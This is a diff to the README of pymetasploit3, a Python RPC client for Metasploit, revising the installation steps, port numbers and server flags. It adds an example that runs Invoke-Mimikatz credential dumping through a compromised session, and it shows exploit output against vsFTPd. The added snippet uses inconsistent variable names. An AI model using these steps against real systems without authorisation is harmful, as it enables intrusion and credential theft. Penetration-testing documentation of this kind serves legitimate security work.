@@ -11,26 +11,27 @@ Original project  : https://github.com/allfro/pymetasploit
 
 # Installation
 
-    git clone https://github.com/DanMcInerney/pymetasploit3
-    cd [Download path]/pymetasploit3
-    pipenv install --three
+    mkdir your-project
+    cd your-project
+    pipenv install --three 
     pipenv shell
     pip3 install pymetasploit3
 
 # Basic Usage
 
 ## Starting Metasploit RPC server
+You can start the RPC server either with ```msfrpcd``` or ```msfconsole```
 
 ### Msfconsole
 This will start the RPC server on port 55552 as well as the Metasploit console UI
 ```bash
 $ msfconsole
-msf> load msgrpc [Pass=yourpassword] 
+msf> load msgrpc [Pass=yourpassword]
 ```
 ### msfrpcd
 This will start the RPC server on port 55553 and will just start the RPC server in the background
 ```bash
-$ msfrpcd -P yourpassword
+$ msfrpcd -P yourpassword -S
 ```
 
 ## RPC client
@@ -45,7 +46,7 @@ $ msfrpcd -P yourpassword
 
 ```python
 >>> from pymetasploit3.msfrpc import MsfRpcClient
->>> client = MsfRpcClient('yourpassword', port=55553)
+>>> client = MsfRpcClient('yourpassword', port=55552)
 ```
 
 ### MsfRpcClient
@@ -181,8 +182,7 @@ Run the same `exploit` object as before but wait until it completes and gather i
 # Some time passes
 '[*] 172.16.14.145:21 - Banner: 220 vsFTPd 2.3.4
 [*] 172.16.14.145:21 - USER: 331 Please specify the password
-...
-'
+...'
 
 ```
 
@@ -201,6 +201,16 @@ Run the same `exploit` object as before but wait until it completes and gather i
 >>> client.sessions.session(session_id).run_with_output(session_command, terminating_strs)
 # Some time passes
 '\nARP Table\n                  ---------------\n  ...`
+```
+Run a PowerShell script with output
+```python
+>>> session_id = '1'
+>>> psh_script_path  = '/home/user/scripts/Invoke-Mimikatz.ps1'
+>>> session = c.sessions.session(sessions_id)
+>>> sessions.import_psh(psh_script_path)
+>>> sessions.run_psh_cmd('Invoke-Mimikatz')
+# Some time passes
+'Mimikatz output...'
 ```
 
 One can also use a timeout and simply return all data found before the timeout expired. `timeout` defaults to 
